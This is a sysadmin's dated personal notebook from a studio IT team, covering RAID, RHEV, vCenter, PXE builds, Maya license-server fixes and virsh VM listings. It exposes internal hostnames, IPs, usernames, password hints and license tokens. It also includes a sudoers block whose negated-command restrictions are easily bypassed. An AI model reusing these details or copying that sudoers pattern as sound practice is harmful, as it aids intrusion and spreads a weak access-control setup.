lrwxrwxrwx 1 root root 10 Sep 15 01:30 pci-0000:03:00.0-scsi-0:1:0:0-part2 -> ../../sda2
lrwxrwxrwx 1 root root  9 Sep 15 01:30 pci-0000:03:00.0-scsi-0:1:0:1 -> ../../sdb

******************************************************************************************************
20Sep17  HP ssacli rpm   adding disks to chug

@@@ usage
https://kallesplayground.wordpress.com/useful-stuff/hp-smart-array-cli-commands-under-esxi/
http://www.thegeekstuff.com/2014/07/hpacucli-examples

@@@ download
http://h20564.www2.hpe.com/hpsc/swd/public/detail?swItemId=MTX_3d16386b418a443388c18da82f&swEnvOid=4181#tab3

@@@ install
[root@chug ~]# yum install /disney/home/dsiegfriedt/JOBS/DISNEYTS/HP/ssacli-2.60-19.0.x86_64.rpm 

@@@ use it
[root@chug ~]# ll /opt/smartstorageadmin/ssacli/bin/ssacli --help

@@@ find the name of the new disks
[root@chug ~]# ll /sys/block
total 0
lrwxrwxrwx 1 root root 0 Sep 18 23:01 dm-0 -> ../devices/virtual/block/dm-0
lrwxrwxrwx 1 root root 0 Sep 18 23:01 dm-1 -> ../devices/virtual/block/dm-1
lrwxrwxrwx 1 root root 0 Sep 18 23:01 dm-2 -> ../devices/virtual/block/dm-2
lrwxrwxrwx 1 root root 0 Sep 18 23:01 loop0 -> ../devices/virtual/block/loop0
lrwxrwxrwx 1 root root 0 Sep 18 23:01 sda -> ../devices/pci0000:00/0000:00:01.0/0000:03:00.0/host0/target0:1:0/0:1:0:0/block/sda
lrwxrwxrwx 1 root root 0 Sep 18 23:01 sdb -> ../devices/pci0000:00/0000:00:01.0/0000:03:00.0/host0/target0:1:0/0:1:0:1/block/sdb

@@@ find the new stuff
[root@chug ~]# /opt/smartstorageadmin/ssacli/bin/ssacli

=> rescan

@@@ NOT that easy

ssacli ctrl slot=0 pd all show detail

{SNIP}

***Unassigned

      physicaldrive 1I:3:3
         Port: 1I
         Box: 3
         Bay: 3
         Status: OK
         Drive Type: Unassigned Drive
         Size: 480 GB

      physicaldrive 1I:3:4
         Port: 1I
         Box: 3
         Bay: 4
         Status: OK
         Drive Type: Unassigned Drive
         Size: 480 GB

      physicaldrive 2I:3:7
         Port: 2I
         Box: 3
         Bay: 7
         Status: OK
         Drive Type: Unassigned Drive
         Size: 480 GB

      physicaldrive 2I:3:8
         Port: 2I
         Box: 3
         Bay: 8
         Status: OK
         Drive Type: Unassigned Drive
         Size: 480 GB

[root@chug ~]# ssacli ctrl slot=0 ld all show status

   logicaldrive 1 (93.1 GB, RAID 1): OK
   logicaldrive 2 (93.1 GB, RAID 1): OK

[root@chug ~]# ssacli ctrl all show config

Smart Array P440ar in Slot 0 (Embedded)   (sn: PDNLH0BRH7V7AL)

   Port Name: 1I

   Port Name: 2I

   Internal Drive Cage at Port 1I, Box 3, OK

   Internal Drive Cage at Port 2I, Box 3, OK

   Array A (Solid State SATA, Unused Space: 0  MB)

      logicaldrive 1 (93.1 GB, RAID 1, OK)

      physicaldrive 1I:3:1 (port 1I:box 3:bay 1, SATA SSD, 100 GB, OK)
      physicaldrive 1I:3:2 (port 1I:box 3:bay 2, SATA SSD, 100 GB, OK)

   Array B (Solid State SATA, Unused Space: 0  MB)

      logicaldrive 2 (93.1 GB, RAID 1, OK)

      physicaldrive 2I:3:5 (port 2I:box 3:bay 5, SATA SSD, 100 GB, OK)
      physicaldrive 2I:3:6 (port 2I:box 3:bay 6, SATA SSD, 100 GB, OK)

   Unassigned

      physicaldrive 1I:3:3 (port 1I:box 3:bay 3, SATA SSD, 480 GB, OK)
      physicaldrive 1I:3:4 (port 1I:box 3:bay 4, SATA SSD, 480 GB, OK)
      physicaldrive 2I:3:7 (port 2I:box 3:bay 7, SATA SSD, 480 GB, OK)
      physicaldrive 2I:3:8 (port 2I:box 3:bay 8, SATA SSD, 480 GB, OK)

[root@chug ~]# 

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@@ sandbox area

1I:3:3,1I:3:4,2I:3:7,2I:3:8

ctrl slot=0 create type=ld drives=1I:3:3,1I:3:4,2I:3:7,2I:3:8 raid=1+0 stripsize=?

slot= ????  # assume where RAID controller card is plugged based on:

=> ctrl slot=0 ld all show status

   logicaldrive 1 (93.1 GB, RAID 1): OK
   logicaldrive 2 (93.1 GB, RAID 1): OK

=> ctrl slot=1 ld all show status
Error: The controller identified by "slot=1" was not detected.
=> ctrl slot=2 ld all show status
Error: The controller identified by "slot=2" was not detected.
AND
=> ctrl all show status

Smart Array P440ar in Slot 0 (Embedded)
   Controller Status: OK
   Cache Status: Not Configured
   Battery/Capacitor Status: OK


type= logical drive


!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

[root@chug ~]# lvextend -L+90g -r /dev/myvg/root /dev/sdb1
  Size of logical volume myvg/root changed from 78.12 GiB (20000 extents) to 171.25 GiB (43840 extents).


***************************************************************************************************
28Sep17  network setup gui (GUI) all machines (rhevhost0[1-2])

nmtui

******************************************************************************************************

rhevhost0[1-2] 

https://10.106.231.207:9090

******************************************************************************************************
28Sep17  rebooting vcsa

dsiegfriedt@dts3329:~/puppet/modules $ ssh root@vcsa (N0...)

VMware vCenter Server Appliance 6.5.0.5200

Type: vCenter Server with an external Platform Services Controller

root@vcsa's password: 
X11 forwarding request failed on channel 0
Last login: Thu Sep 28 20:49:15 2017 from 10.106.224.6
Connected to service

    * List APIs: "help api list"
    * List Plugins: "help pi list"
    * Launch BASH: "shell"

Command> shell
Shell access is granted to root
root@vcsa [ ~ ]# reboot

@@@ it will seem like it takes forever to get to the website.... you'll be able to login and poke around before 
    the website is available.
******************************************************************************************************
28Sep17
@@@ occationally Lance Thorton from autodesk will ask for reportlog.rl

on dipper

[root@dipper flexnetserver]# pwd
/opt/flexnetserver

less reportlog.rl

tar czvf reportlog-<date>.rl.tgz reportlog.rl

mv reportlog.rl-<date>.rl.tgz /disney/home/dsiegfriedt/JOBS/DISNEYTS/


******************************************************************************************************
29Sep17  new machine build not picking up "forman"  for build of a new windows machine/VM

@@@ this can NOT be running if you are trying to build a linux machine/vm

wds = windows deployment service.   

rdesktop  wds.win.disneytoonstudios.com
  login with DTSAD\administrator
    <root passwd>
RT click on Windows Deployment Services => wdsg.win.disneytoonstudios.com => All Tasks

@@@ Start should NOT be highlighted to prove that it is not running

OR it is not plugged into the correct network

@@@ in this case "avenger" had multiple intances in dhcpd.leases  (see note from 2Oct17)

27Dec17 from Grace's windows braindump


How to start WDS service:
  Rdesktop to wds.win.disneytoonstudios.com. Login as DTSAD\Administrator 
  Launch "Windows Deployment Services" Application 
  Select Servers, the right click "wds.win.disneytoonstudios.com", click "Properties"
  Select "PXE Response" tab then check "Respond to all client computers". Click Apply, then OK
  Right click "wds.win.disneytoonstudios.com" again, then select "All Tasks", then "Start"
  Reboot the laptop/workstation to proceed with pxeboot build 
  
*Make sure to stop the service again after the build

28Dec17
@@@ if you are building a windows VM from satellite, this process must be stopped
       	   THIS according to Grace

see 3Jan18 for building a win2012R2 VM

******************************************************************************************************
2Oct17  rhev attach export domain

System => Data Center => Storage (lower) => attach export => select (radio button) => click OK

******************************************************************************************************
2Oct17 gdm (gnome display manager) after fresh rebuild

dsiegfriedt@bearcat:~/JOBS/DISNEYTS/DEADLINE/DEADLINE10 $ sudo systemctl status gdm
● gdm.service - GNOME Display Manager
   Loaded: loaded (/usr/lib/systemd/system/gdm.service; disabled; vendor preset: enabled)
   Active: inactive (dead)

dsiegfriedt@bearcat:~/JOBS/DISNEYTS/DEADLINE/DEADLINE10 $ sudo systemctl enable gdm
Created symlink from /etc/systemd/system/display-manager.service to /usr/lib/systemd/system/gdm.service.

dsiegfriedt@bearcat:~/JOBS/DISNEYTS/DEADLINE/DEADLINE10 $ sudo systemctl start gdm

dsiegfriedt@bearcat:~/JOBS/DISNEYTS/DEADLINE/DEADLINE10 $ sudo systemctl status gdm
● gdm.service - GNOME Display Manager
   Loaded: loaded (/usr/lib/systemd/system/gdm.service; enabled; vendor preset: enabled)
   Active: active (running) since Mon 2017-10-02 13:15:11 PDT; 3s ago
  Process: 34367 ExecStartPost=/bin/bash -c TERM=linux /usr/bin/clear > /dev/tty1 (code=exited, status=0/SUCCESS)
 Main PID: 34360 (gdm)
   Memory: 43.6M
   CGroup: /system.slice/gdm.service
           ├─34360 /usr/sbin/gdm
           └─34366 /usr/bin/Xorg :0 -background none -noreset -audit 4 -verbose -auth /ru...

Oct 02 13:15:10 bearcat.disneytoonstudios.com systemd[1]: Starting GNOME Display Manager...
Oct 02 13:15:11 bearcat.disneytoonstudios.com systemd[1]: Started GNOME Display Manager.
Oct 02 13:15:12 bearcat.disneytoonstudios.com gdm[34360]: AccountsService: SetLanguage c...2
Oct 02 13:15:12 bearcat.disneytoonstudios.com gdm-launch-environment][34383]: pam_limits(...
Oct 02 13:15:12 bearcat.disneytoonstudios.com gdm-launch-environment][34383]: pam_limits(...
Hint: Some lines were ellipsized, use -l to show in full.
dsiegfriedt@bearcat:~/JOBS/DISNEYTS/DEADLINE/DEADLINE10 $ 

******************************************************************************************************
2Oct17  rhev UUIDs (uuid) on rhevm

see ~/JOBS/DISNEYTS/RHEV/VMIDs

******************************************************************************************************
2Oct17   avenger would not build for Maya/Cole/siggy/OR Grace

@@@ seach for errors or any mention of the machine (look at MAC address as well as IP)

@@@ Grace found this kb
https://access.redhat.com/solutions/2022803
	@@@ edit /var/lib/dhcpd/dhcpd.leases and remove any intense of machine in question. 

******************************************************************************************************
2Oct17   centos 7 hardening guide

https://www.lisenet.com/2017/centos-7-server-hardening-guide/

******************************************************************************************************
3Oct17   MAC sudoers  ###changes to tomcat

## added 2Oct17  --siggy
User_Alias	SYS = dsiegfriedt,gthompson,jhenricks,jgottfredson,jmiddleton,sdenduluri,gneagle,mkarp,cpeterson,gbrentin
SYS ALL=(ALL) ALL

User_Alias	DEV = acheney,akong,jparks,kjaffe,wwira,afuchs,ccasian,rthompson
DEV ALL=(ALL) !/usr/bin/vi /etc/passwd, !/usr/bin/vi /etc/sudoers, !/usr/sbin/adduser, !/usr/bin/vi /etc/group. !/usr/bin/vi /boot/grub/grub.conf !/usr/sbin/visudo

User_Alias	WDAS = csteinke,jcarrill,khayes,nbarber,sseed,mschnittker
WDAS ALL=(ALL) !/usr/bin/vi /etc/passwd, !/usr/bin/vi /etc/sudoers, !/usr/sbin/adduser, !/usr/bin/vi /etc/group. !/usr/bin/vi /boot/grub/grub.conf !/usr/sbin/visudo



******************************************************************************************************
3Oct17  document adding OSX machines to satellite.

http://confluence.disneytoonstudios.com/display/TEC/Adding-a-hostname-to-satellite
******************************************************************************************************
3Oct17  Grace's document on the RHEV upgrade to 4.1

http://confluence.disneytoonstudios.com/display/TEC/RHEV+4.1
******************************************************************************************************
3Oct17  

upload vmdk to datastore
@@@ got this error

The operation failed for an undetermined reason. Typically this problem occurs due to certificates 
that the browser does not trust. If you are using self-signed or custom certificates, open the 
URL below in a new browser tab and accept the certificate, then retry the operation.

https://vsphere-prod-01.disneytoonstudios.com 

If this does not resolve the problem, other possible solutions are shown in this KB article:
http://kb.vmware.com/kb/2147256

@@@ this seems to have worked... I just have to upload the vmdk into a datastore
https://www.crucial.com.au/blog/2009/11/21/how-to-import-virtual-machines-into-esxi-using-the-vsphere-client/

Home => Hosts and Clusters => Datastore (select nest-???)
Browse Files
Use the icon with the up arrow in front of some disks (Upload files to this datastore) [Top Right]
Upload the folder or files that you require.
Create a new (or use an existing) VM and use the vmdk file you have uploaded.

@@@ see ~/images/1-3.jpg for pics

@@@ upload a datastore failed

started from scratch...... create new VM in RHEV

@@@ can't clear existing VMs from satellite :^(

ERROR: Failed to destroy a compute RHEV (RHEV) instance
vmtestsiggy.disneytoonstudios.com: 
ActiveRecord:RecordNotFound; Failed to create 
vmtestsiggy.disneytoonstudios.com's relm entry: can't modify frozen Hash

******************************************************************************************************
11Oct17  munki

hostname:
vmmunki.disneytoonstudios.com

pwd:
/disney/dist/mac/munki_repo

@@@ my stuff should probably go in "sysadmin"

******************************************************************************************************
13Oc17  NetApp 2700

dsiegfriedt@dts3329:~ $ ll /disney/home/gracet/docs/dts-wdas-notes/storage
total 735K
drwxrwxr-x. 4 gracet prodctn  914 Apr 12  2016 .
drwxrwxr-x. 9 gracet prodctn 1.4K Apr 11  2016 ..
lrwxrwxrwx. 1 gracet prodctn   12 Sep 22  2015 E2700.hostnames -> E2700.netapp
-rw-rw-r--. 1 gracet prodctn  815 Sep 22  2015 E2700.netapp
-rw-rw-r--. 1 gracet prodctn 2.9K Mar 10  2016 E2700.storage.mapping
-rw-rw-r--. 1 gracet prodctn  115 Sep 14  2015 E2700.volume.create
-rw-rw-r--. 1 gracet prodctn 1.2K May 15  2015 E2700.wwn
lrwxrwxrwx. 1 gracet prodctn    8 May 18  2015 cisco -> ../cisco
-rw-rw-r--. 1 gracet prodctn  168 Jul 14  2015 dts-db-01.raid
drwxrwxr-x. 2 gracet prodctn    0 Mar  2  2016 fas8020
-rw-rw-r--. 1 gracet prodctn 1.6K Apr 12  2016 flogi.database.mds9148s1
-rw-rw-r--. 1 gracet prodctn 1.6K Apr 12  2016 flogi.database.mds9148s2
drwxrwxr-x. 2 gracet prodctn   32 Apr 11  2016 home_dusers_cutover
lrwxrwxrwx. 1 gracet prodctn   48 Jul 14  2015 hpssacli.cmd -> /disney/home/stevec/how2/db/storage/hpssacli.cmd
-rw-rw-r--. 1 gracet prodctn  356 Jan 12  2016 increase-volume-size
-rw-rw-r--. 1 gracet prodctn 1.8K Apr 12  2016 mds9148s1.show_zones
-rw-rw-r--. 1 gracet prodctn 1.6K Apr 12  2016 mds9148s2.show_zones
-rw-rw-r--. 1 gracet prodctn 3.8K May  8  2015 mds.9148s.init.startup
-rw-rw-r--. 1 gracet prodctn 3.4K May 17  2015 mds.9148s.setup
-rw-rw-r--. 1 gracet prodctn 7.3K May 11  2015 mds.port-zoning
-rw-rw-r--. 1 gracet prodctn  30K May 11  2015 mds.port-zoning.session
-rw-rw-r--. 1 gracet prodctn   71 May 19  2015 mkfs
lrwxrwxrwx. 1 gracet prodctn   20 Nov 16  2015 nimbus -> ../../storage/nimbus
-rw-rw-r--. 1 gracet prodctn  10K Apr 12  2016 remove_zone
-rw-rw-r--. 1 gracet prodctn  883 Jul  1  2015 rename_zoneset
-rw-rw-r--. 1 gracet prodctn  693 May 18  2015 rhev.add.volume
-rw-rw-r--. 1 gracet prodctn  124 Sep 22  2015 santricity
-rw-rw-r--. 1 gracet prodctn  14K Mar  7  2016 santricity.install
lrwxrwxrwx. 1 gracet prodctn   21 May 17  2015 scan.fc -> E2700.storage.mapping
-rw-rw-r--. 1 gracet prodctn   12 Jul 27  2015 sss_cache



gracet [10:59 AM]
Quick Answer: ssh -Y dts-nbu-01
then launch: /opt/SMgr/client/SMclient

******************************************************************************************************
16Oct17  

RHEV can only have 1 NFS active domain.   I had to put ISO_DOMAIN in mantenance to get Virt-v2v to activate
TY Grace!!!

Data Center --> DTS (top) --> Storage (bottom) --> "Attach Exports" --> radio button; OK --> 

17Oct17
ISO-domain was in maintenance but not detached.... DOH   detach and try to atttach expots domain
@@@ NOPE

I copied the info back into the directory and the EFer attached/activated


******************************************************************************************************
17Oct17  new RHEV cluster

dsiegfriedt@dts3329:~ $ ssh root@rhevengine
root@rhevengine's password: 


from the wesite:
https://rhevengine.disneytoonstudios.com/ovirt-engine/
https://rhevengine.disneytoonstudios.com/ovirt-engine/sso/login.html

login: admin
passwd: C...
Profile: internal

rhevhost01
rhevhost02

28Mar18 memory moved back to host2

******************************************************************************************************
20Oct17 git for ansible

ssh collector.disneytoonstudios.com

dsiegfriedt@dts3329:~ $ man git init

Start a new Git repository for an existing code base

               
$ cd /etc/ansible
$ git init
$ git add .
$ git commit
           
1. Create a /etc/ansible/.git directory.
2. Add all existing files to the index.
3. Record the pristine state as the first commit in the history.

******************************************************************************************************
20Oct17  monitor shotgun with zabbix howto

https://www.zabbix.com/documentation/3.4/manual/web_monitoring

******************************************************************************************************
20Oct17  virsh vm list from hosts  (TY Grace)
https://access.redhat.com/discussions/672423

virsh # help list
  NAME
    list - list domains

  SYNOPSIS
    list [--inactive] [--all] [--transient] [--persistent] [--with-snapshot] [--without-snapshot] [--state-running] [--state-paused] [--state-shutoff] [--state-other] [--autostart] [--no-autostart] [--with-managed-save] [--without-managed-save] [--uuid] [--name] [--table] [--managed-save] [--title]

  DESCRIPTION
    Returns list of domains.

  OPTIONS
    --inactive			list inactive domains
    --all            		list inactive & active domains
    --transient      		list transient domains
    --persistent     		list persistent domains
    --with-snapshot  		list domains with existing snapshot
    --without-snapshot  	list domains without a snapshot
    --state-running  		list domains in running state
    --state-paused   		list domains in paused state
    --state-shutoff  		list domains in shutoff state
    --state-other    		list domains in other states
    --autostart      		list domains with autostart enabled
    --no-autostart   		list domains with autostart disabled
    --with-managed-save  	list domains with managed save state
    --without-managed-save  	list domains without managed save
    --uuid           		list uuid's only
    --name           		list domain names only
    --table          		list table (default)
    --managed-save   		mark inactive domains with managed save state
    --title          		show domain title

@@@ where virsh list give the VM names, and virsh --uuids give the UUIDs.. nothing co-ordinates the 2

[root@oljammer ~]# virsh
Welcome to virsh, the virtualization interactive terminal.

Type:  'help' for help with commands
       'quit' to quit

virsh # list --all
Please enter your authentication name: vdsm@rhevh
Please enter your password: (sh...)
 Id    Name                           State
----------------------------------------------------
 3     vmcoda                         running
 200   vmnotify                       running
 201   vmcron                         running
 202   vmlogger                       running
 203   vmprodcron                     running
 205   vmprism01                      running
 206   vmhaproxy                      running
 207   vmprism08                      running
 208   vmprism03                      running
 217   vmprism11                      running
 218   vmgitlab                       running
 219   vmotp                          running
 220   vmmariadb1                     running
 228   zu-cala-rt                     running
 229   vmwinfmp                       running
 230   vmcodadb1                      running
 231   vmprodcronel6                  running
 232   vmnetworkmgr                   running
 233   vmnetmonitor                   running
 235   vmdepotapp                     running
 239   vmprism05                      running
 240   vmfaceroll                     running
 248   siggytest1                     running

virsh # list --uuid
956df9d4-787f-46c9-aec2-cb5f84de9f0a
563d3ac0-3689-4503-a76a-02ebbe832f0f
b55ee006-be98-4ace-bd50-7762e0473a85
86bc291f-2aaa-4a08-9b98-fee4362bd991
6fcbe9d2-43dd-4187-9112-1c6b60b62073
05523caa-9170-4f5d-bd4d-aef60645d0a1
6f7e9267-3f14-4f34-b8cf-809f2437feee
28164be5-e517-47db-80da-40731eeefdec
37559a99-836a-4f30-a41c-75ae78607f1f
0f5e2718-c628-40a9-9c26-757c9b9ffa4b
7879ee3c-a8f1-4d04-8318-d1d27cd8ef35
9a02c0da-a412-4b70-8976-e3001ced0a47
4786fa12-bfb7-4c91-bfe2-3942a28bafd6
e71439ca-9b7c-4082-a711-b2b966dd2f57
a89e4c7d-6c2d-4b07-8476-f671a640d99d
42c0d392-7868-45d0-8672-2a71d87e0a9d
0f8b761e-d586-482b-99b7-805a9daea447
fd120d72-fee0-4cfe-8b2e-e8ed00891bdd
7802174f-17b1-42f6-bb3c-2a973b3c3bca
78cb9ea7-090a-44d5-b9d6-986977557e69
dff12b5a-7ce8-4d53-b576-69cf87883192
485edb27-cfea-4d98-a1ce-4f0f3ea4aa2a
46e544b5-d2c5-4677-ba0b-8731c6908c60

@@@ they are in the same order as the "list --all"

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

[root@ned ~]# virsh
Welcome to virsh, the virtualization interactive terminal.

Type:  'help' for help with commands
       'quit' to quit

virsh # list --all
Please enter your authentication name: vdsm@rhevh
Please enter your password: 
 Id    Name                           State
----------------------------------------------------
 3     vmdepotdev                     running
 7     vmcronel6                      running
 8     vmroll                         running
 18    vmmunki                        running
 31    vmprodmanel7                   running
 35    vmprodmanstage                 running
 142   vmprism10                      running
 148   vmprism06                      running
 152   vmpostgres2                    running
 157   vmprism02                      running
 158   vmprism07                      running
 161   vmpostgres1                    running
 170   vmdpix                         running
 177   vmidmrep                       running
 179   vmdepot                        running
 180   vmmediawiki                    running
 182   sgshipping-staging             running
 184   vmpingfederate                 running
 185   vmmariadb2                     running
 188   vmgitlabhooks                  running

virsh # list --uuid
eb3b9113-6b59-4389-af48-ec18be4ec55b
40bce1b9-148c-491c-ad5b-f437a9f68939
279ff70d-5f63-4376-aead-08469c3a215c
7e6679b9-20e0-4706-ab8f-8ae62b345f13
5d71b5db-50c3-46fb-b518-76b474ad41c7
7b9615c1-27c6-4e1f-8438-a88509f9cde9
76e3ab80-a723-48a3-88cf-10d9d6211160
1bb07063-3c27-421e-9ec5-27ce8d3372da
a09a2043-98da-46ce-a982-2235f0de0b97
be6d6e25-36e2-4a63-a5ff-ef4b17f2666a
24ec1abf-d4e4-46b4-b027-aa8350d5786e
19c5cd6a-5bbf-47eb-ab2e-c853bf5cc376
0a03e7f4-d122-448b-abe5-b5913c6c57b0
1e84f1a1-9355-46ce-9d6a-a48b86805ade
2967b01f-9fdd-4761-a6d7-df56326a9fdf
8a2d2199-65c7-491d-9acc-eb05de910770
f47fad4f-e3be-4950-8eaf-f3bb481f3f10
c4a2ad81-6678-4ad5-b04f-00dc3a74b82a
b8816ada-d810-4006-9bb8-64ddd4c51318
a78bfd83-69d3-45e4-a0d0-8dd968c42b2b

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

[root@leadbottom ~]# virsh
Welcome to virsh, the virtualization interactive terminal.

Type:  'help' for help with commands
       'quit' to quit

virsh # list --all
Please enter your authentication name: vdsm@rhevh
Please enter your password: 
 Id    Name                           State
----------------------------------------------------
 10    vmcodadb2                      running
 60    vmamyel7                       running
 137   vmds389                        running
 162   vmrollel7                      running
 172   vmradius                       running
 173   vmbackupdb                     running
 174   vmhadoop                       running
 179   atlassian-dev                  running
 195   vmcorpdir                      running
 196   sgshipping                     running
 202   vmprism09                      running
 204   vmapi                          running
 211   vmicodav5ping                  running
 215   vmdeadline                     running
 219   vmcodesearch                   running
 220   vmel7                          running
 222   vmcups                         running
 224   vmjameson                      running
 226   vmmrrobot                      running
 227   vmjenkins                      running
 228   vmcrashplan                    running
 230   vmmailhub                      running

virsh # list --uuid
6546056c-386e-4407-89b9-e64a13d9a4e9
7b7ce324-6025-4f56-97be-2bba5196af45
7b146624-a0df-4549-8f9a-6cea00a6dd0e
7b93c362-f08e-4ed2-8404-c584f0a6916d
2747aad1-2fb8-43aa-a084-6f4cd17a89e8
191965fd-7add-4643-b049-6fb8a48a59cd
e61978f0-6da9-48a2-8edf-1f5029b3ef9e
dbf45d2a-1902-4a6b-b671-005abfc8b465
fdc5c59a-439c-41f4-9f92-72c8843d0258
975def62-35c4-4ae0-8f1f-1e4dd96f835c
59d6b650-2d14-4f52-9fc4-ea5a0d7d6301
cf8eba53-75b8-4cb9-bd2c-1a20ebf2744b
a1687ba9-4ba6-465d-ab62-eeb769504ac0
848a8465-f98f-4012-be68-3f3516d8b470
5916dc00-51cc-4041-b047-8e5064f6ceae
69adaedd-8212-492c-82d0-422ea783bbbd
83b746b6-ab23-462b-990b-4cff1b87eb83
6875a799-cd79-494f-8c1b-e4012bdea3d4
887731c4-5552-4da2-85d2-baabacd377ee
773cbcce-951a-4cbe-8acc-bf82f3a8df47
cafff14e-4db0-4467-b01f-fa386b23a3bb
47071f0c-7676-4f6b-bd5b-4c3ebd04dce5

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@@ can (~/JOBS/DISNEYTS/RHEV/RHEV-VM-UUID-list.txt) make a single list of name/uuid but why not use the part I need... the UUID.  This will have to run for EACH of the "host" machines (ned, oljammer, and leadbottom)

******************************************************************************************************

systemctl stop deadline10launcher;/opt/Thinkbox/Deadline10/uninstall --mode unattended;chkconfig --del deadline10launcher;rm -f /etc/init.d/deadline10launcher


/disney/home/dsiegfriedt/JOBS/DISNEYTS/DEADLINE/DEADLINE8/deadline-silent-install

30Nov17  @@@ followed same for d207$i
for i in $(seq 10 46); do echo d206$i; ssh -t d206$i; /disney/home/dsiegfriedt/JOBS/DISNEYTS/DEADLINE/DEADLINE10/upgrade-script.bash; echo; done


******************************************************************************************************
25Oct17  patio website 

is run on dts-web on dts-esx-02.swna.wdpd.disney.com

******************************************************************************************************
30Oct17   maya not getting licensing.......

@@@ started by hand

/opt/flexnetserver/flexnetserver_11.12/adskflex -T dipper.disneytoonstudios.com 11.13 3 -c :/opt/flexnetserver/license.lic: -lmgrd_port 6978 -srv Zm5cHvCLrjrkG35VOrLMSsd4MkJEXehTZo6K9htT58AtD5avvUukMH6tAwmRusX -daemon_port 820 --lmgrd_start 57d345f1 -vdrestart 0

@@@ no good 
@@@ with the help of Grace

[root@dipper flexnetserver]# cat /etc/init.d/MayaLicenseInitScript 
#!/bin/bash -x
#
# Flexlm server to license Maya software
#
# chkconfig: 2345 99 01
# description: This process is run from /opt/flexnetserver/
# processname: lmgrd
# process is run as user lmadmin

# source function library.
. /etc/rc.d/init.d/functions

FLEXNETHOME=/opt/flexnetserver
LOGFILE=/scratch2/mayalmgrd.log
LICENSE_FILE=$FLEXNETHOME/license.lic
SERVER=$FLEXNETHOME/lmgrd
{SNIP}

cat /scratch2/mayalmgrd.log

@@@ dipper had rebooted and never removed this lock file.
@@@ when starting by hand... this file was owned by root so THAT was a second problem
  
[root@dipper var]# ll /var/tmp
total 76
drwxr-xr-x. 2 root        root    4096 Aug 23 13:36 genarts
-rw-r--r--. 1 root        root       4 Oct 28 02:40 hlserver.pid
-rw-------. 1 root        root     500 Oct 30 11:16 host_0
-rw-r--r--. 1 root        root    5846 Feb 24  2017 installpbx-61925-022417181930.log
-rw-r--r--. 1 lmadmin     lmadmin    0 Oct 30 11:29 lockadskflex

{SNIP}

@@@ once removed maya worked
 4596  30Oct17-11:28:17  /etc/init.d/MayaLicenseInitScript stop
 4597  30Oct17-11:28:27  /etc/init.d/MayaLicenseInitScript status
 4603  30Oct17-11:29:17  /etc/init.d/MayaLicenseInitScript start

[root@dipper log]# chkconfig --list | grep -i maya
MayaLicenseInitScript	0:off	1:off	2:on	3:on	4:on	5:on	6:off
You have new mail in /var/spool/mail/root

@@@ what lic services should be running
dsiegfriedt@dipper:~ $ ps -ef | grep lic
root      2218     1  0 Oct28 ?        01:29:17 /opt/isotropix/ilise/ilise -license_folder /opt/isotropix/ilise/licenses
root      2853     1  0 Oct28 ?        00:00:03 /usr/local/tweak/bin/tlm_server -f /usr/local/tweak/etc/license.gto -log /scratch2/tlmserver.log
root      2922     1  0 Oct28 ?        00:01:08 /opt/videocopilot//server/vc_license_server -d -l /opt/videocopilot//server/license -ld /var/log/ -pd /var/run/
root      3057     1  0 Oct28 ?        00:00:15 /usr/local/foundry/LicensingTools7.1/bin/FLEXlm/lmgrd.foundry -c /usr/local/foundry/FLEXlm/foundry.lic -l /usr/local/foundry/FLEXlm/log/foundry.log -local
root      3062  3057  0 Oct28 ?        00:01:04 foundry -T dipper.disneytoonstudios.com 10.8 3 -c /usr/local/foundry/FLEXlm/foundry.lic -lmgrd_port 6978 --lmgrd_start 59f4509a
root      3087     1  0 Oct28 ?        00:00:30 /usr/local/foundry/LicensingTools7.1/bin/RLM/rlm.foundry -ws 4102 -c /usr/local/foundry/RLM/foundry.lic -dlog /usr/local/foundry/RLM/log/foundry.log
root      3436     1  0 Oct28 ?        00:00:25 /usr/pixologic/rlm/rlm -c /usr/pixologic/rlm/pixologic.lic -dlog /usr/pixologic/rlm/rlm-pixologic.log -ws 5073
1825200333 25504 25479  0 15:17 pts/3  00:00:00 grep lic
lmadmin  49526     1  0 Oct30 ?        00:00:13 /opt/flexnetserver/lmgrd -c /opt/flexnetserver/license.lic
lmadmin  49536 49526  0 Oct30 ?        00:01:02 adskflex -T dipper.disneytoonstudios.com 11.13 5 -c :/opt/flexnetserver/license.lic: -lmgrd_port 6979 -srv yLWsQMtZWh7wlYJfXlEA5Po4w7Cviae4aMBZupxJGurYBEfaf51n2mwvHEDsBXL -daemon_port 820 --lmgrd_start 59f76f7d -vdrestart 0

******************************************************************************************************
30Oct17

To find the time system was rebooted. 
Type -> who -b 

******************************************************************************************************
31Oct17 depot SHITE

vmcron:/usr/local/bin/

[root@vmcron ~]# ll /usr/local/bin
total 76
-rwxr-xr-x. 1 root root 23480 May  5 17:06 depot2idm.py
-rwxr-xr-x. 1 root root 25344 Jun  2  2015 sio_ntap_linux
-rwxr-xr-x. 1 root root 16157 Jan 19  2017 usercleanup.py
-rwxr-xr-x. 1 root root   600 Jun  2  2015 waitfornet
-rwxr-xr-x. 1 root root   567 Nov 22  2016 zabbix_top.bash

@@@ none called from root cron


******************************************************************************************************
2Nov17  superfortress video  see ~/DOCS/NOTES-AJA

Short answer is that it is done in cron @reboot
******************************************************************************************************
2Nov17 from Grace

dynamic hosts lists 2 ways puppet and hammer

@@@ from any machine that has puppet running

gracet at collector in ~
 #  facter -p virtual
vmware
gracet at vmprodmanel7 in ~
 #  facter -p virtual
rhev

((()))
[root@chug ~]# hammer fact list --search "fact = virtual and value = kvm"

[root@chug ~]# hammer fact list --search "fact = virtual and value = vmware"
******************************************************************************************************
8Nov17  zabbix process monitoring
https://www.zabbix.com/documentation/3.4/manual/config/items/userparameters/extending_agent

@@@ stopped puppet for testing (it kept reverting the file)

@@@ add the following to:
sudo vim /etc/zabbix/zabbix_agentd.conf

(Shift g to get to the end)
